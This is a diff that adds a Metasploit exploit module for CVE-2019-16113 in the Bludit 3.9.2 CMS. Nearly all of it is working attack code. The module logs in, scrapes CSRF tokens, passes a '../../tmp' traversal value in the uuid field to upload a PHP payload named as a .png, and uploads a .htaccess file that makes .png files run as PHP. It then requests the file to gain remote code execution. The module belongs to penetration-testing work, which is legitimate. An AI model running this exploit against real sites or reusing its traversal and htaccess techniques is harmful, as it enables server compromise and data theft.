@@ -1,0 +1,262 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::PhpEXE
+  include Msf::Exploit::FileDropper
+  include Msf::Auxiliary::Report
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",
+      'Description'    => %q{
+        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
+        parameter in the image upload feature in order to save a malicious payload anywhere
+        onto the server, and then use a custom .htaccess file to bypass the file extension
+        check to finally get remote code execution.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'christasa', # Original discovery
+          'sinn3r'     # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2019-16113'],
+          ['URL', 'https://github.com/bludit/bludit/issues/1081'],
+          ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]
+        ],
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Notes'          =>
+        {
+          'SideEffects' => [ IOC_IN_LOGS ],
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability'   => [ CRASH_SAFE ]
+        },
+      'Targets'        =>
+        [
+          [ 'Bludit v3.9.2', {} ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => "2019-09-07",
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
+        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
+        OptString.new('BLUDITPASS', [true, 'The password for Bludit'])
+      ])
+  end
+
+  class PhpPayload
+    attr_reader :payload
+    attr_reader :name
+
+    def initialize(p)
+      @payload = p
+      @name = "#{Rex::Text.rand_text_alpha(10)}.png"
+    end
+  end
+
+  class LoginBadge
+    attr_reader   :username
+    attr_reader   :password
+    attr_accessor :csrf_token
+    attr_accessor :bludit_key
+
+    def initialize(user, pass, token, key)
+      @username = user
+      @password = pass
+      @csrf_token = token
+      @bludit_key = key
+    end
+  end
+
+  def check
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, 'index.php')
+    })
+
+    unless res
+      vprint_error('Connection timed out')
+      return CheckCode::Unknown
+    end
+
+    html = res.get_html_document
+    generator_tag = html.at('meta[@name="generator"]')
+    unless generator_tag
+      vprint_error('No generator metadata tag found in HTML')
+      return CheckCode::Safe
+    end
+
+    content_attr = generator_tag.attributes['content']
+    unless content_attr
+      vprint_error("No content attribute found in metadata tag")
+      return CheckCode::Safe
+    end
+
+    if content_attr.value == 'Bludit'
+      return CheckCode::Detected
+    end
+
+    CheckCode::Safe
+  end
+
+  def get_uuid(login_badge)
+    print_status('Retrieving UUID...')
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, 'admin', 'new-content', 'index.php'),
+      'cookie' => "BLUDIT-KEY=#{login_badge.bludit_key};"
+    })
+
+    unless res
+      fail_with(Failure::Unknown, 'Connection timed out')
+    end
+
+    html = res.get_html_document
+    uuid_element = html.at('input[@name="uuid"]')
+    unless uuid_element
+      fail_with(Failure::Unknown, 'No UUID found in admin/new-content/')
+    end
+
+    uuid_val = uuid_element.attributes['value']
+    unless uuid_val && uuid_val.respond_to?(:value)
+      fail_with(Failure::Unknown, 'No UUID value')
+    end
+
+    uuid_val.value
+  end
+
+  def upload_file(login_badge, uuid, content, fname)
+    print_status("Uploading #{fname}...")
+
+    data = Rex::MIME::Message.new
+    data.add_part(content, 'image/png', nil, "form-data; name=\"images[]\"; filename=\"#{fname}\"")
+    data.add_part(uuid, nil, nil, 'form-data; name="uuid"')
+    data.add_part(login_badge.csrf_token, nil, nil, 'form-data; name="tokenCSRF"')
+
+    res = send_request_cgi({
+      'method'  => 'POST',
+      'uri'     => normalize_uri(target_uri.path, 'admin', 'ajax', 'upload-images'),
+      'ctype'   => "multipart/form-data; boundary=#{data.bound}",
+      'cookie'  => "BLUDIT-KEY=#{login_badge.bludit_key};",
+      'headers' => {'X-Requested-With' => 'XMLHttpRequest'},
+      'data'    => data.to_s
+    })
+
+    unless res
+      fail_with(Failure::Unknown, 'Connection timed out')
+    end
+  end
+
+  def upload_php_payload_and_exec(login_badge)
+    # From: /var/www/html/bludit/bl-content/uploads/pages/5821e70ef1a8309cb835ccc9cec0fb35/
+    # To: /var/www/html/bludit/bl-content/tmp
+    uuid = get_uuid(login_badge)
+    php_payload = get_php_payload
+    upload_file(login_badge, '../../tmp', php_payload.payload, php_payload.name)
+
+    # On the vuln app, this line occurs first:
+    # Filesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);
+    # Even though there is a file extension check, it won't really stop us
+    # from uploading the .htaccess file.
+    htaccess = <<~HTA
+    RewriteEngine off
+    AddType application/x-httpd-php .png
+    HTA
+    upload_file(login_badge, uuid, htaccess, ".htaccess")
+    register_file_for_cleanup('.htaccess')
+
+    print_status("Executing #{php_payload.name}...")
+    send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, 'bl-content', 'tmp', php_payload.name)
+    })
+  end
+
+  def get_php_payload
+    @php_payload ||= PhpPayload.new(get_write_exec_payload(unlink_self: true))
+  end
+
+  def get_login_badge(res)
+    cookies = res.get_cookies
+    bludit_key = cookies.scan(/BLUDIT\-KEY=(.+);/i).flatten.first || ''
+
+    html = res.get_html_document
+    csrf_element = html.at('input[@name="tokenCSRF"]')
+    unless csrf_element
+      fail_with(Failure::Unknown, 'No tokenCSRF found')
+    end
+
+    csrf_val = csrf_element.attributes['value']
+    unless csrf_val && csrf_val.respond_to?(:value)
+      fail_with(Failure::Unknown, 'No tokenCSRF value')
+    end
+
+    LoginBadge.new(datastore['BLUDITUSER'], datastore['BLUDITPASS'], csrf_val.value, bludit_key)
+  end
+
+  def do_login
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, 'admin', 'index.php')
+    })
+
+    unless res
+      fail_with(Failure::Unknown, 'Connection timed out')
+    end
+
+    login_badge = get_login_badge(res)
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'admin', 'index.php'),
+      'cookie'    => "BLUDIT-KEY=#{login_badge.bludit_key};",
+      'vars_post' =>
+        {
+          'tokenCSRF' => login_badge.csrf_token,
+          'username'  => login_badge.username,
+          'password'  => login_badge.password
+        }
+    })
+
+    unless res
+      fail_with(Failure::Unknown, 'Connection timed out')
+    end
+
+    # A new csrf value is generated, need to update this for the upload
+    if res.headers['Location'].to_s.include?('/admin/dashboard')
+      store_valid_credential(user: login_badge.username, private: login_badge.password)
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri'    => normalize_uri(target_uri.path, 'admin', 'dashboard', 'index.php'),
+        'cookie' => "BLUDIT-KEY=#{login_badge.bludit_key};",
+      })
+
+      unless res
+        fail_with(Failure::Unknown, 'Connection timed out')
+      end
+
+      new_csrf = res.body.scan(/var tokenCSRF = "(.+)";/).flatten.first
+      login_badge.csrf_token = new_csrf if new_csrf
+      return login_badge
+    end
+
+    fail_with(Failure::NoAccess, 'Authentication failed')
+  end
+
+  def exploit
+    login_badge = do_login
+    print_good("Logged in as: #{login_badge.username}")
+    upload_php_payload_and_exec(login_badge)
+  end
+end
